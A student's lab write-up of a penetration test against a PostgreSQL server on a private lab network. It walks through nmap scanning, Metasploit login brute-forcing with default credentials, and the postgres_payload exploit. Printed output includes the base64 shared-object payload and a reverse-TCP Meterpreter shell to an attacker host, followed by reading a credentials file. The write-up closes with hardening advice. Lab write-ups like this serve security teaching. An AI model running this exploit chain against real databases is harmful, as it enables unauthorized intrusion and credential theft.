# Week5 discussion

The objective this week is to select one exploit and port from the provided list. 

Then, I need to recover a set of credentials in a text file in a folder specific to my team and student number. 

I chose PostgreSQL, port 5432.

I'll be using `NMAP` and the `Metasploit Framework` to accomplish this Penetration Test objective.

## Reconnaissance. Using Nmap.

I started by scanning the target machine for port 5432, the common port number for PostgreSQL.

```bash
nmap -p 5432 10.2.2.100
```

Result:
```text
Starting Nmap 7.70 ( https://nmap.org ) at 2023-09-17 15:56 EDT
Nmap scan report for 10.2.2.100
Host is up (0.00035s latency).

PORT     STATE SERVICE
5432/tcp open  postgresql
MAC Address: 00:0C:29:30:E1:15 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.18 seconds
```
![1](image.png)

## Exploitation. Using Metasploit Framework

Once I confirmed port 5432 is open, I started up `msfconsole` and searched for any modules related to `postgresql`

```bash
msfconsole

msf5 > search postgresql

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   1   auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   2   auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
   3   auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
   4   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     Yes    PostgreSQL Database Name Command Line Flag Injection
   5   auxiliary/scanner/postgres/postgres_login                                    normal     Yes    PostgreSQL Login Utility
   6   auxiliary/scanner/postgres/postgres_version                                  normal     Yes    PostgreSQL Version Probe
   7   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   8   exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   9   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   10  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   11  exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   12  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   13  post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
```

For this attack, I'm planning to use three modules:

1. `auxiliary/scanner/postgres/postgres_login`
2. `auxiliary/admin/postgres/postgres_sql`
3. `exploit/linux/postgres/postgres_payload`

-------------------

### Using: auxiliary/scanner/postgres/postgres_login

```bash
msf5 > use auxiliary/scanner/postgres/postgres_login 
```

I'm just using the default options, but I'll need to set the RHOST to the target machine IP address. 

```bash
msf5 auxiliary(scanner/postgres/postgres_login) > set RHOST 10.2.2.100
RHOST => 10.2.2.100
```
Run scanner.


```bash
msf5 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[+] 10.2.2.100:5432 - Login Successful: postgres:postgres@template1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Success!**

I have valid credentials to the PostgreSQL database using a bruteforce dictionary attack. 

I'm going to pivot to the next module and validate the credentials.

### Using: auxiliary/admin/postgres/postgres_sql

I set the RHOST once again to the target IP address. 

I used ChatGPT to get the SQL statement that would return the list of databases, then I set the SQL option as well. 

![Alt text](image-5.png)


```bash
msf5 auxiliary(scanner/postgres/postgres_login) > use auxiliary/admin/postgres/postgres_sql 

msf5 auxiliary(admin/postgres/postgres_sql) > show options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   DATABASE       template1         yes       The database to authenticate against
   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
   RETURN_ROWSET  true              no        Set to true to see query result sets
   RHOSTS                           yes       The target address range or CIDR identifier
   RPORT          5432              yes       The target port
   SQL            select version()  no        The SQL query to execute
   USERNAME       postgres          yes       The username to authenticate as
   VERBOSE        false             no        Enable verbose output

msf5 auxiliary(admin/postgres/postgres_sql) > set RHOST 10.2.2.100
RHOST => 10.2.2.100

msf5 auxiliary(admin/postgres/postgres_sql) > set SQL select datname from pg_database;
SQL => select datname from pg_database;

msf5 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.2.2.100

Query Text: 'select datname from pg_database;'
==============================================

    datname
    -------
    postgres
    template0
    template1

[*] Auxiliary module execution completed
```

## Using: exploit/linux/postgres/postgres_payload

OK. We confirmed that we have valid postgreSQL credentials. Let's try to run the last module, the linux postgresql exploit: 

```bash
msf5 auxiliary(admin/postgres/postgres_sql) > use exploit/linux/postgres/postgres_payload 
msf5 exploit(linux/postgres/postgres_payload) > show options

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target address range or CIDR identifier
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


Exploit target:

   Id  Name
   --  ----
   0   Linux x86
```

Unsurprisingly, most of the options are already set as needed. I just need to set the RHOST, but I also want to make this verbose so I can follow along with how the exploit is being performed.

```bash
msf5 exploit(linux/postgres/postgres_payload) > set RHOST 10.2.2.100
RHOST => 10.2.2.100
msf5 exploit(linux/postgres/postgres_payload) > set VERBOSE true
VERBOSE => true
msf5 exploit(linux/postgres/postgres_payload) > run

[*] Started reverse TCP handler on 10.2.2.50:4444 
[*] Trying postgres:postgres@10.2.2.100:5432/template1
[*] 10.2.2.100:5432 Postgres - querying with 'select version()'
[*] 10.2.2.100:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] 10.2.2.100:5432 Postgres - querying with 'select lo_creat(-1)'
[*] 10.2.2.100:5432 Postgres - querying with 'delete from pg_largeobject where loid=16386'
[*] 10.2.2.100:5432 Postgres - querying with 'insert into pg_largeobject (loid,pageno,data) values(16386, 0, decode('f0VMRgEBAQAAAAAAAAAAAAMAAwABAAAAAAAAADgAAABABAAAAAAAADQAIAAEACgADgANAAAAAAAGAAAAOAAAADgAAAA4AAAAgAAAAIAAAAAFAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAUAwAAFAMAAAUAAAAAEAAAAQAAABgDAAAYEwAAGBMAACgBAAAoAQAABgAAAAAQAAACAAAAmAMAAJgTAACYEwAAgAAAAIAAAAAGAAAAAAAAABwAAAAkAwAAZAAAACAAAABAAAAAAQAAAAEAAAAvdG1wL2FPTlhQdUJyLnNvAABsaWJjLnNvLjYAbW1hcABtZW1jcHkAbXByb3RlY3QAX2V4aXQAZm9yawB1bmxpbmsAAAIAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgUAAAHAQAALBQAAAcCAAAwFAAABwMAADQUAAAHBAAAOBQAAAcFAAA8FAAABwYAABgUAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAABIAAAAQAAAAAAAAAAAAAAASAAAAFwAAAAAAAAAAAAAAEgAAACAAAAAAAAAAAAAAABIAAAAmAAAAAAAAAAAAAAASAAAAKwAAAAAAAAAAAAAAEgAAAFbojwAAAInGjYYz/v//XsNVieWD7ARTVmoAagBqImoDaAAQAABqAOh6AAAAg8QYiUX8anzoXAAAAInGjYaTEAAAUP91/OhxAAAAg8QMagdoABAAAP91/Oh0AAAAg8QMhcB0CmoB6HsAAACDxAToiAAAAIXAdQP/VfzoFwAAAInGjYZP/v//UOiDAAAAg8QEXluJ7F3D6AAAAABYg8D7wwD/cwT/Ywjo6v///42YlxEAAP9jDGoA6eX////o1f///42YlxEAAP9jEGoI6dD////owP///42YlxEAAP9jFGoQ6bv////oq////42YlxEAAP9jGGoY6ab////olv///42YlxEAAP9jHGog6ZH////ogf///42YlxEAAP9jIGoo6Xz///8AAAAAagpeMdv341NDU2oCsGaJ4c2Al1toCgICMmgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2AAAAAAAABAAAAAQAAABkAAAAYFAAAGwAAAAQAAAAFAAAA5QAAAAoAAAAyAAAABAAAABgBAAADAAAAHBQAABcAAABIAQAAAgAAADAAAAAUAAAAEQAAABMAAAAIAAAAEQAAAHgBAAASAAAACAAAAAYAAACAAQAACwAAABAAAAAAAAAAAAAAAAACAACYEwAAAAAAAAAAAACkAgAAuQIAAM4CAADjAgAA+AIAAA0DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgAAAAEAAAACAAAAuAAAALgAAAAtAAAAAAAAAAAAAAAIAAAACAAAABIAAAADAAAAAgAAAOUAAADlAAAAMgAAAAAAAAAAAAAAAQAAAAEAAAAaAAAABQAAAAIAAAAYAQAAGAEAACwAAAAGAAAAAAAAAAQAAAAEAAAAIAAAAAkAAAACAAAASAEAAEgBAAAwAAAABgAAAAAAAAAIAAAACAAAACkAAAAJAAAAAgAAAHgBAAB4AQAACAAAAAYAAAAAAAAACAAAAAgAAAAyAAAACwAAAAIAAACAAQAAgAEAAHAAAAACAAAAAQAAAAQAAAAQAAAAOgAAAAEAAAAGAAAA8AEAAPABAACfAAAAAAAAAAAAAAAIAAAACAAAACQAAAABAAAABgAAAJACAACQAgAAhAAAAAAAAAAAAAAABAAAAAQAAABAAAAAAQAAAAMAAAAYEwAAGAMAAHwAAAAAAAAAAAAAAAgAAAAIAAAAAQAAAAYAAAADAAAAmBMAAJgDAACAAAAAAgAAAAAAAAAIAAAACAAAAEYAAAAOAAAAAwAAABgUAAAYBAAABAAAAAAAAAAAAAAABAAAAAQAAABSAAAAAQAAAAMAAAAcFAAAHAQAACQAAAAAAAAAAAAAAAQAAAAEAAAAWwAAAAMAAAAAAAAAAAAAAHAGAABlAAAAAAAAAAAAAAABAAAAAQAAAAAuZHluYW1pYwAucm9kYXRhAC5keW5zdHIALmhhc2gALnJlbC5wbHQALnJlbC5keW4ALmR5bnN5bQAudGV4dAAuZGF0YQAuaW5pdF9hcnJheQAuZ290LnBsdAAuc2hzdHJ0YWIA', 'base64'))'
[*] 10.2.2.100:5432 Postgres - querying with 'select lo_export(16386, '/tmp/aONXPuBr.so')'
[*] Uploaded as /tmp/aONXPuBr.so, should be cleaned up automatically
[*] 10.2.2.100:5432 Postgres - querying with 'create or replace function pg_temp.qNBXIyoYtx() returns void as '/tmp/aONXPuBr.so','qNBXIyoYtx' language c strict immutable'
[*] 10.2.2.100:5432 Postgres - Disconnected
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (985320 bytes) to 10.2.2.100
[*] Meterpreter session 1 opened (10.2.2.50:4444 -> 10.2.2.100:37554) at 2023-09-17 16:26:22 -0400

meterpreter > 
```
**We have shell!**

The only thing left to do is navigate the file system and look for the credentials that I need to collect.

```bash
meterpreter > cd /
meterpreter > ls -a | grep -o redteam2
Listing: redteam2
=================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  4096  dir   2020-10-22 18:27:31 -0400  student1
40777/rwxrwxrwx  4096  dir   2020-10-22 18:27:31 -0400  student2
40777/rwxrwxrwx  4096  dir   2020-10-22 18:27:31 -0400  student3
40777/rwxrwxrwx  4096  dir   2020-10-22 18:27:31 -0400  student4
40777/rwxrwxrwx  4096  dir   2020-10-22 18:27:31 -0400  student5
40777/rwxrwxrwx  4096  dir   2020-10-22 18:27:31 -0400  student6

meterpreter > cd redteam2/student2
meterpreter > ls
Listing: /redteam2/student2
===========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  25    fil   2020-10-22 18:27:31 -0400  mypass.txt

meterpreter > cat mypass.txt
cmVkdGVhbTJzdHVkZW50Mg==

```

![Alt text](image-2.png)

## Summary

The following modifications should be performed to secure the PostgreSQL database:

1. **Change Default Credentials:** Modify the default PostgreSQL user (postgres) password.

2. **Strong Passwords:** Enforce strong, complex passwords for users.

3. **Limit Network Access:** Configure PostgreSQL to listen on trusted IP addresses. Use a firewall to restrict incoming connections.

4. **Audit Logging:** Enable audit logs for monitoring.

5. **Regular Updates:** Keep PostgreSQL and OS updated.

6. **Backup and Recovery:** Establish regular backups.

7. **Security Audits:** Conduct security assessments regularly.

8. **User Training:** Educate users on security best practices.

Securing PostgreSQL applications is critical to protect sensitive data, prevent unauthorized access, and ensure compliance with regulations. Failing to secure PostgreSQL can lead to data breaches, legal consequences, and reputational damage, emphasizing the importance of robust database security measures.

